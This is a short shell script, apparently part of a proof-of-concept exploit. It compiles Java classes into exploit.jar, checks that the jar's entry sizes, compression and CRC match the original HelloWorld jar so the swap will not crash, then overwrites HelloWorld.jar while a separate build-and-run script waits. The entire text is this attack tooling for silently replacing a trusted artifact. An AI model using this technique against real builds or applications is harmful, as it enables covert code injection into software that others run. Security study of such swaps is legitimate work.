cd Exploit;
javac HelloWorld/*.java;
cd ../BuildDirForExploit;
cp ../Exploit/HelloWorld/*.class HelloWorld/;
rm exploit.jar
jar cf exploit.jar HelloWorld/*.class;
unzip -lv exploit.jar | tail -n +2 | sed -E 's/ +/ /g' | cut -d " " -f 2,4,5,9 > ../x;
unzip -lv ../OrigHelloWorld.jar | tail -n +2 | sed -E 's/ +/ /g' | cut -d " " -f 2,4,5,9 > ../y;
diff ../x ../y && echo "" && echo "NO DIFF IN COMPRESSION, EXPLOIT WILL SUCCEED" && echo "" || echo "DIFF IN COMP, EXPLOIT WILL CRASH";
ls -al exploit.jar;
ls -al ../HelloWorld.jar;
cp exploit.jar ../HelloWorld.jar;
rm ../x ../y;
echo ""
echo "Now click enter in the other tab to complete the ./build-and-run.sh)"
